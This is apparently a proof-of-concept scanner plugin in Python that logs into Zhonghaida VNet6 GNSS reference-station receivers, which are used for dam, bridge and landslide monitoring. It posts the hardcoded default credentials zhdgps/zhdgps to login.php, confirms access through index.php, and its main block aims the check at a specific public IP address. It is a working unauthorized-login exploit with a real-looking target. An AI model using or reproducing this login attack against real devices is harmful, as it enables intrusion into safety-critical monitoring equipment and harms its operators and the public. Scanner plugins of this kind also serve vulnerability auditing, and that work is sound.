#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse

"""

该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。


POC Name  : 中海达VNet6专业型参考站接收机 默认密码登陆
Author    :  a
mail      :  a@lcx.cc

使用默认的账号密码(zhdgps/zhdgps)

"""

def assign(service, arg):
    if service == 'zhonghaida_vnet':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    payload = 'login.php'
    data = 'usr=zhdgps&psw=zhdgps&force=1&action=1&lang=zh&redirect=%2Findex.php%3Flang%3Dz'
    url = arg +  payload
    code, head,res, errcode, _ = curl.curl2(url,data)
    url2 = arg + 'index.php'
    code, head,res, errcode, _ = curl.curl2(url2)
    if '/pages/zh/download.php' in res and code==200:
        security_hole(url + '   user:zhdgps pass:zhdgps')
    


if __name__ == '__main__':
    from dummy import *
    audit(assign('zhonghaida_vnet', 'http://222.32.91.55/')[1])